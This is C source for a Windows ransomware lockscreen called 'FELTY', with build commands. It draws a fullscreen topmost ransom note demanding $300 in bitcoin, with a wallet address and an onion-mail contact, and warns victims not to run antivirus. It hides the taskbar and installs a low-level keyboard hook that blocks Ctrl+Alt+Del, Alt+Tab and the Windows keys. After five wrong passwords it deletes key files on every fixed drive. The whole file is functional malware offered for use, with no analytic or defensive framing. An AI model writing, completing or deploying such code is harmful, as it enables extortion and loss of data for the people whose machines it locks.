/*
 * felty_binder.c — Native Win32 Fullscreen Lockscreen (HTML-style redesign)
 * Rewritten visual rendering to match the HTML design: FELTY ASCII logo,
 * matrix rain background, terminal box, info panels, payment section,
 * warning list, and permanent lock flash overlay on 5 failures.
 *
 * Password: FELTY-RECOVER-2025 (5 attempts, then key destroyed + permanent flash)
 *
 * Compile (64-bit):
 *   x86_64-w64-mingw32-gcc -Os -s -Wall -o felty_binder.exe felty_binder.c \
 *       -lcrypt32 -ladvapi32 -lgdi32 -luser32 -mwindows
 *
 * Compile (32-bit):
 *   i686-w64-mingw32-gcc -Os -s -Wall -o felty_binder.exe felty_binder.c \
 *       -lcrypt32 -ladvapi32 -lgdi32 -luser32 -mwindows
 */

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

#define PASSWORD   L"FELTY-RECOVER-2025"
#define MAX_TRIES  5
#define UNLOCK_FLAG L"C:\\felty_unlocked.txt"

/* ─── GLOBALS ─── */
static volatile int g_attempts   = 0;
static volatile int g_wipe      = 0;
static volatile int g_unlocked  = 0;
static HWND    g_hwnd    = NULL;
static HWND    g_edit    = NULL;
static HHOOK   g_kb_hook = NULL;
static HFONT   g_font_small = NULL;
static HFONT   g_font_med   = NULL;
static HFONT   g_font_big   = NULL;
static HFONT   g_font_huge  = NULL;
static HFONT   g_font_mono  = NULL;
static UINT_PTR g_timer_repaint = 0;
static UINT_PTR g_timer_flash   = 0;
static int     g_flash_state    = 0;
static int     g_matrix_init    = 0;

/* ─── FELTY ASCII LOGO (from HTML) ─── */
static const char *g_logo[] = {
    "    ╔═══╗╔═══╗╔══╗ ╔══╗╔═══╗╔═══╗╔═══╗╔══╗",
    "    ║╔═╗║║╔═╗║║╔╗║ ║╔╗║║╔══╝║╔═╗║║╔═╗║║╔╗║",
    "    ║╚═╝║║║ ║║║╚╝╚╗║╚╝║║╚══╗║╚═╝║║║ ║║║╚╝╚╗",
    "    ║╔╗╔╝║╚═╝║║╔═╗║║╔╗║║╔══╝║╔╗╔╝║╚═╝║║╔═╗║",
    "    ║║║╚╗║╔═╗║║╚═╝║║║║║║╚══╗║║║╚╗║╔═╗║║╚═╝║",
    "    ╚╝╚═╝╚╝ ╚╝╚═══╝╚╝╚╝╚═══╝╚╝╚═╝╚╝ ╚╝╚═══╝",
    NULL
};

/* ─── MATRIX RAIN ─── */
#define MATRIX_COLS 160
static int      g_drops[MATRIX_COLS];
static wchar_t  g_rain_chars[] = L"FELTY01HEX#@!$%&";

static void init_matrix(void)
{
    for (int i = 0; i < MATRIX_COLS; i++)
        g_drops[i] = rand() % 100;
    g_matrix_init = 1;
}

static void draw_matrix_rain(HDC hdc, int sw, int sh)
{
    if (!g_matrix_init) init_matrix();

    HFONT mfont = CreateFontW(10, 0, 0, 0, FW_NORMAL, 0, 0, 0,
        ANSI_CHARSET, 0, 0, ANTIALIASED_QUALITY, 0, L"Courier New");
    SelectObject(hdc, mfont);
    SetBkMode(hdc, TRANSPARENT);

    int cols = sw / 10;
    if (cols > MATRIX_COLS) cols = MATRIX_COLS;

    for (int i = 0; i < cols; i++) {
        int r = 180 - (rand() % 40);
        SetTextColor(hdc, RGB(r, rand() % 20, 0));
        wchar_t ch[2] = { g_rain_chars[rand() % (wcslen(g_rain_chars) - 1)], 0 };
        TextOutW(hdc, i * 10, g_drops[i] * 10, ch, 1);
        if (g_drops[i] * 10 > sh && (rand() % 40) == 0)
            g_drops[i] = 0;
        g_drops[i]++;
    }
    DeleteObject(mfont);
}

/* ─── DRAW PERMANENT LOCK FLASH SCREEN ─── */
static void draw_permanent_lock(HDC hdc, int sw, int sh)
{
    g_flash_state = !g_flash_state;
    COLORREF bg = g_flash_state ? RGB(0, 0, 0) : RGB(26, 0, 0);
    COLORREF tc = g_flash_state ? RGB(255, 51, 51) : RGB(255, 255, 255);
    COLORREF tc2 = g_flash_state ? RGB(255, 68, 68) : RGB(200, 100, 100);
    COLORREF tc3 = g_flash_state ? RGB(255, 136, 136) : RGB(180, 180, 180);

    HBRUSH fbg = CreateSolidBrush(bg);
    RECT rc = {0, 0, sw, sh};
    FillRect(hdc, &rc, fbg);
    DeleteObject(fbg);
    SetBkMode(hdc, TRANSPARENT);

    /* Logo */
    SelectObject(hdc, g_font_mono);
    SetTextColor(hdc, RGB(204, 0, 0));
    int ly = sh / 2 - 130;
    for (int i = 0; g_logo[i]; i++) {
        TextOutA(hdc, sw / 2 - 170, ly, g_logo[i], strlen(g_logo[i]));
        ly += 16;
    }

    /* "FILES DESTROYED" */
    SelectObject(hdc, g_font_huge);
    SetTextColor(hdc, tc);
    TextOutW(hdc, sw / 2 - 200, sh / 2 - 10, L"FILES DESTROYED", 15);

    /* Subtitle */
    SelectObject(hdc, g_font_med);
    SetTextColor(hdc, tc2);
    TextOutW(hdc, sw / 2 - 180, sh / 2 + 30, L"// PERMANENTLY ENCRYPTED //", 27);

    /* Body */
    SelectObject(hdc, g_font_small);
    SetTextColor(hdc, tc3);
    TextOutW(hdc, sw / 2 - 200, sh / 2 + 60, L"You had 5 attempts to recover your data.", 40);
    TextOutW(hdc, sw / 2 - 200, sh / 2 + 78, L"You failed every single one.", 28);

    SelectObject(hdc, g_font_med);
    SetTextColor(hdc, RGB(255, 0, 0));
    TextOutW(hdc, sw / 2 - 180, sh / 2 + 110, L"NOTHING CAN SAVE YOUR FILES NOW.", 33);

    SelectObject(hdc, g_font_small);
    SetTextColor(hdc, RGB(255, 68, 68));
    TextOutW(hdc, sw / 2 - 200, sh / 2 + 150, L"[ THIS SYSTEM IS PERMANENTLY LOCKED ]", 38);

    if (!g_timer_flash) {
        g_timer_flash = SetTimer(g_hwnd, 3, 150, NULL);
    }
}

/* ─── DRAW NORMAL LOCK SCREEN (HTML-style) ─── */
static void draw_normal_screen(HDC hdc, int sw, int sh)
{
    /* Black background */
    HBRUSH bg = CreateSolidBrush(RGB(0, 0, 0));
    RECT rc = {0, 0, sw, sh};
    FillRect(hdc, &rc, bg);
    DeleteObject(bg);
    SetBkMode(hdc, TRANSPARENT);

    /* ─── MATRIX RAIN (subtle) ─── */
    draw_matrix_rain(hdc, sw, sh);

    /* ─── TERMINAL BOX ─── */
    int box_w = 780;
    int box_h = sh - 80;
    int box_x = (sw - box_w) / 2;
    int box_y = 40;

    if (box_w > sw - 20) box_w = sw - 20;

    /* Outer border */
    HPEN border = CreatePen(PS_SOLID, 2, RGB(180, 0, 0));
    SelectObject(hdc, border);
    SelectObject(hdc, GetStockObject(NULL_BRUSH));
    Rectangle(hdc, box_x, box_y, box_x + box_w, box_y + box_h);
    DeleteObject(border);

    /* Inner fill */
    HBRUSH inner = CreateSolidBrush(RGB(10, 0, 0));
    RECT ir = {box_x + 1, box_y + 1, box_x + box_w - 1, box_y + box_h - 1};
    FillRect(hdc, &ir, inner);
    DeleteObject(inner);

    int cx = box_x + 25;
    int cy = box_y + 15;

    /* ═══ LOGO ═══ */
    SelectObject(hdc, g_font_mono);
    SetTextColor(hdc, RGB(204, 0, 0));
    for (int i = 0; g_logo[i]; i++) {
        TextOutA(hdc, cx + 50, cy, g_logo[i], strlen(g_logo[i]));
        cy += 15;
    }
    cy += 10;

    /* ═══ TITLE ═══ */
    SelectObject(hdc, g_font_huge);
    SetTextColor(hdc, RGB(255, 0, 0));
    TextOutW(hdc, cx + 220, cy, L"FELTY", 5);
    cy += 38;

    SelectObject(hdc, g_font_small);
    SetTextColor(hdc, RGB(255, 68, 68));
    TextOutW(hdc, cx + 150, cy, L"// YOUR SYSTEM HAS BEEN LOCKED //", 33);
    cy += 40;

    /* ═══ PASSWORD PROMPT ═══ */
    HPEN pw = CreatePen(PS_SOLID, 1, RGB(204, 0, 0));
    SelectObject(hdc, pw);
    Rectangle(hdc, cx, cy, cx + box_w - 50, cy + 40);
    DeleteObject(pw);

    SelectObject(hdc, g_font_small);
    SetTextColor(hdc, RGB(255, 68, 68));
    TextOutW(hdc, cx + 50, cy + 12,
        L"> ENTER DECRYPTION PASSWORD TO UNLOCK SYSTEM", 48);
    cy += 55;

    /* Attempts remaining status */
    wchar_t buf[64];
    wsprintfW(buf, L"[ ATTEMPTS REMAINING: %d / %d ]",
        MAX_TRIES - g_attempts, MAX_TRIES);
    SelectObject(hdc, g_font_small);
    SetTextColor(hdc, g_attempts >= 3 ? RGB(255, 68, 68) : RGB(255, 136, 0));
    TextOutW(hdc, cx + 180, cy, buf, wcslen(buf));
    cy += 30;

    /* ═══ INFO PANELS ═══ */
    int panel_w = (box_w - 80) / 2;
    int panel_y = cy;

    HPEN pp = CreatePen(PS_SOLID, 1, RGB(204, 0, 0));
    SelectObject(hdc, pp);

    /* Left panel — System Status */
    Rectangle(hdc, cx, panel_y, cx + panel_w, panel_y + 130);
    SelectObject(hdc, g_font_small);
    SetTextColor(hdc, RGB(255, 68, 68));
    TextOutW(hdc, cx + 10, panel_y + 8, L"// SYSTEM STATUS", 16);
    SetTextColor(hdc, RGB(255, 136, 136));
    TextOutW(hdc, cx + 10, panel_y + 32, L"Encryption: ", 12);
    SetTextColor(hdc, RGB(255, 0, 0));
    TextOutW(hdc, cx + 95, panel_y + 32, L"AES-256-CBC", 11);
    SetTextColor(hdc, RGB(255, 136, 136));
    TextOutW(hdc, cx + 10, panel_y + 52, L"Key Exchange: ", 14);
    SetTextColor(hdc, RGB(255, 0, 0));
    TextOutW(hdc, cx + 105, panel_y + 52, L"RSA-4096", 8);
    SetTextColor(hdc, RGB(255, 136, 136));
    TextOutW(hdc, cx + 10, panel_y + 72, L"Status: ", 8);
    SetTextColor(hdc, RGB(255, 0, 0));
    TextOutW(hdc, cx + 70, panel_y + 72, L"LOCKED", 6);

    /* Right panel — Payment */
    int p2x = cx + panel_w + 20;
    Rectangle(hdc, p2x, panel_y, p2x + panel_w, panel_y + 130);
    SelectObject(hdc, g_font_small);
    SetTextColor(hdc, RGB(255, 68, 68));
    TextOutW(hdc, p2x + 10, panel_y + 8, L"// PAYMENT REQUIRED", 19);
    SetTextColor(hdc, RGB(255, 136, 136));
    TextOutW(hdc, p2x + 10, panel_y + 28, L"RANSOM AMOUNT:", 15);
    SelectObject(hdc, g_font_med);
    SetTextColor(hdc, RGB(255, 204, 0));
    TextOutW(hdc, p2x + 10, panel_y + 48, L"$300.00 USD", 12);
    SelectObject(hdc, g_font_small);
    SetTextColor(hdc, RGB(255, 136, 51));
    TextOutW(hdc, p2x + 10, panel_y + 72, L"1FELTYa1zP1eP5QGefi2DMPTfTL5SLmv7", 37);
    SetTextColor(hdc, RGB(255, 68, 68));
    TextOutW(hdc, p2x + 10, panel_y + 100, L"BTC ADDRESS", 11);
    TextOutW(hdc, p2x + panel_w - 70, panel_y + 100, L"72:00:00", 8);

    DeleteObject(pp);

    cy = panel_y + 145;

    /* ═══ WARNINGS ═══ */
    HPEN wp = CreatePen(PS_SOLID, 1, RGB(204, 0, 0));
    SelectObject(hdc, wp);
    Rectangle(hdc, cx, cy, cx + box_w - 50, cy + 105);
    DeleteObject(wp);

    SelectObject(hdc, g_font_small);
    SetTextColor(hdc, RGB(255, 0, 0));
    TextOutW(hdc, cx + 15, cy + 10, L">> DO NOT ATTEMPT TO DECRYPT FILES YOURSELF", 44);
    SetTextColor(hdc, RGB(255, 68, 68));
    TextOutW(hdc, cx + 15, cy + 30, L">> DO NOT RUN ANTIVIRUS - IT WILL DELETE THE KEY", 49);
    TextOutW(hdc, cx + 15, cy + 50, L">> DO NOT SHUT DOWN OR RESTART YOUR COMPUTER", 46);
    TextOutW(hdc, cx + 15, cy + 70, L">> ONLY FELTY DECRYPTION TOOL CAN RESTORE FILES", 48);

    cy += 115;

    /* ═══ CONTACT ═══ */
    SetTextColor(hdc, RGB(255, 68, 68));
    TextOutW(hdc, cx + 20, cy, L"CONTACT:  feltyhelp@onionmail.org", 34);
    SetTextColor(hdc, RGB(255, 136, 51));
    wchar_t mid[64];
    wsprintfW(mid, L"Machine ID: FELTY-%04X-%04X",
        rand() & 0xFFFF, rand() & 0xFFFF);
    TextOutW(hdc, cx + 20, cy + 18, mid, wcslen(mid));
}

/* ─── WINDOW PROC ─── */
static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM w, LPARAM l)
{
    switch (msg) {
    case WM_CREATE: {
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);

        g_edit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | ES_PASSWORD | ES_CENTER | ES_AUTOHSCROLL,
            sw / 2 - 130, sh / 2 + sh / 20 + 10, 260, 32,
            hwnd, (HMENU)100, NULL, NULL);
        SendMessageW(g_edit, WM_SETFONT, (WPARAM)g_font_med, TRUE);
        SetFocus(g_edit);
        break;
    }
    case WM_COMMAND: {
        if (LOWORD(w) == 100 && HIWORD(w) == EN_UPDATE) break;
        break;
    }
    case WM_CHAR: {
        if (g_wipe) return 0;
        if (w == VK_RETURN) {
            wchar_t pw[256];
            GetWindowTextW(g_edit, pw, 256);
            if (wcscmp(pw, PASSWORD) == 0) {
                g_unlocked = 1;
                HANDLE hf = CreateFileW(UNLOCK_FLAG, GENERIC_WRITE, 0,
                    NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hf != INVALID_HANDLE_VALUE) {
                    DWORD dummy;
                    WriteFile(hf, L"UNLOCKED", 16, &dummy, NULL);
                    CloseHandle(hf);
                }
                DestroyWindow(hwnd);
                return 0;
            }
            g_attempts++;
            if (g_attempts >= MAX_TRIES) {
                g_wipe = 1;
                /* Destroy key files */
                wchar_t syspath[MAX_PATH];
                GetSystemDirectoryW(syspath, MAX_PATH);
                wchar_t kp[MAX_PATH];
                wcscpy(kp, syspath);
                wcscat(kp, L"\\key.eky");
                DeleteFileW(kp);
                wchar_t d[256];
                GetLogicalDriveStringsW(256, d);
                wchar_t *dp = d;
                while (*dp) {
                    if (GetDriveTypeW(dp) == DRIVE_FIXED) {
                        wcscpy(kp, dp);
                        wcscat(kp, L".eky");
                        DeleteFileW(kp);
                    }
                    dp += wcslen(dp) + 1;
                }
                /* Disable edit box */
                EnableWindow(g_edit, FALSE);
                ShowWindow(g_edit, SW_HIDE);
                /* Kill repaint timer, start flash via draw loop */
                InvalidateRect(hwnd, NULL, TRUE);
            }
            SetWindowTextW(g_edit, L"");
            InvalidateRect(hwnd, NULL, TRUE);
            return 0;
        }
        if (w == VK_ESCAPE || w == VK_TAB) return 0;
        break;
    }
    case WM_KEYDOWN:
    case WM_SYSKEYDOWN: {
        if (w == VK_ESCAPE || w == VK_F4 || w == VK_TAB ||
            w == VK_LWIN || w == VK_RWIN) return 0;
        break;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);

        if (g_wipe) {
            draw_permanent_lock(hdc, sw, sh);
        } else {
            draw_normal_screen(hdc, sw, sh);
        }
        EndPaint(hwnd, &ps);
        break;
    }
    case WM_TIMER: {
        if (w == 1) {
            /* Repaint timer for matrix rain animation */
            InvalidateRect(hwnd, NULL, FALSE);
        }
        break;
    }
    case WM_CLOSE:
        return 0;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProcW(hwnd, msg, w, l);
    }
    return 0;
}

/* ─── KEYBOARD HOOK (blocks Ctrl+Alt+Del, Win keys, Alt+Tab, Alt+Esc) ─── */
static LRESULT CALLBACK KbProc(int code, WPARAM w, LPARAM l)
{
    if (code >= 0) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)l;
        if (kb->vkCode == VK_DELETE &&
            (GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
            (GetAsyncKeyState(VK_MENU) & 0x8000))
            return 1;
        if (kb->vkCode == VK_LWIN || kb->vkCode == VK_RWIN)
            return 1;
        if (kb->vkCode == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000))
            return 1;
        if (kb->vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_MENU) & 0x8000))
            return 1;
    }
    return CallNextHookEx(g_kb_hook, code, w, l);
}

/* ─── HIDE TASKBAR ─── */
static void hide_taskbar(void)
{
    HWND hTaskBar = FindWindowW(L"Shell_TrayWnd", NULL);
    if (hTaskBar) ShowWindow(hTaskBar, SW_HIDE);
    HWND hStart = FindWindowW(L"Button", NULL);
    if (hStart) {
        HWND hParent = GetParent(hStart);
        if (hParent) ShowWindow(hParent, SW_HIDE);
    }
}

/* ─── ENTRY POINT ─── */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
    /* Single instance */
    HANDLE hm = CreateMutexW(NULL, TRUE, L"Global\\FeltyBinderMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    /* Check if already unlocked */
    if (GetFileAttributesW(UNLOCK_FLAG) != INVALID_FILE_ATTRIBUTES) {
        CloseHandle(hm);
        return 0;
    }

    srand((unsigned int)time(NULL));

    /* Hide taskbar */
    hide_taskbar();

    /* Install keyboard hook */
    g_kb_hook = SetWindowsHookExW(WH_KEYBOARD_LL, KbProc, hInst, 0);

    /* Create fonts */
    g_font_small = CreateFontW(12, 0, 0, 0, FW_NORMAL, 0, 0, 0,
        ANSI_CHARSET, 0, 0, ANTIALIASED_QUALITY, 0, L"Courier New");
    g_font_med = CreateFontW(16, 0, 0, 0, FW_NORMAL, 0, 0, 0,
        ANSI_CHARSET, 0, 0, ANTIALIASED_QUALITY, 0, L"Courier New");
    g_font_big = CreateFontW(22, 0, 0, 0, FW_BOLD, 0, 0, 0,
        ANSI_CHARSET, 0, 0, ANTIALIASED_QUALITY, 0, L"Courier New");
    g_font_huge = CreateFontW(32, 0, 0, 0, FW_BOLD, 0, 0, 0,
        ANSI_CHARSET, 0, 0, ANTIALIASED_QUALITY, 0, L"Courier New");
    g_font_mono = CreateFontW(14, 0, 0, 0, FW_NORMAL, 0, 0, 0,
        ANSI_CHARSET, 0, 0, ANTIALIASED_QUALITY, 0, L"Courier New");

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    /* Register window class */
    WNDCLASSW wc = {0};
    wc.style         = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInst;
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"FeltyBinderLock";
    RegisterClassW(&wc);

    /* Create fullscreen topmost window */
    g_hwnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE,
        L"FeltyBinderLock", L"Locked",
        WS_POPUP | WS_VISIBLE,
        0, 0, sw, sh,
        NULL, NULL, hInst, NULL);

    /* Create password edit box */
    /* Positioned below the terminal content vertically */
    g_edit = CreateWindowExW(
        WS_EX_CLIENTEDGE, L"EDIT", L"",
        WS_CHILD | WS_VISIBLE | ES_PASSWORD | ES_CENTER | ES_AUTOHSCROLL,
        sw / 2 - 130, sh / 2 + sh / 20 + 10, 260, 32,
        g_hwnd, (HMENU)100, hInst, NULL);
    SendMessageW(g_edit, WM_SETFONT, (WPARAM)g_font_med, TRUE);

    /* Position and show */
    SetWindowPos(g_hwnd, HWND_TOPMOST, 0, 0, sw, sh, SWP_SHOWWINDOW);
    SetForegroundWindow(g_hwnd);
    SetFocus(g_edit);

    /* Timer to drive matrix animation and repaints */
    g_timer_repaint = SetTimer(g_hwnd, 1, 70, NULL);

    ShowWindow(g_hwnd, SW_SHOWMAXIMIZED);

    /* Message loop */
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        if (g_unlocked) break;
    }

    /* Cleanup */
    if (g_timer_repaint) KillTimer(g_hwnd, g_timer_repaint);
    if (g_timer_flash) KillTimer(g_hwnd, g_timer_flash);
    if (g_kb_hook) UnhookWindowsHookEx(g_kb_hook);

    /* Restore taskbar */
    HWND hTaskBar = FindWindowW(L"Shell_TrayWnd", NULL);
    if (hTaskBar) ShowWindow(hTaskBar, SW_SHOW);

    if (g_font_small) DeleteObject(g_font_small);
    if (g_font_med) DeleteObject(g_font_med);
    if (g_font_big) DeleteObject(g_font_big);
    if (g_font_huge) DeleteObject(g_font_huge);
    if (g_font_mono) DeleteObject(g_font_mono);
    DestroyWindow(g_hwnd);
    CloseHandle(hm);
    return 0;
}
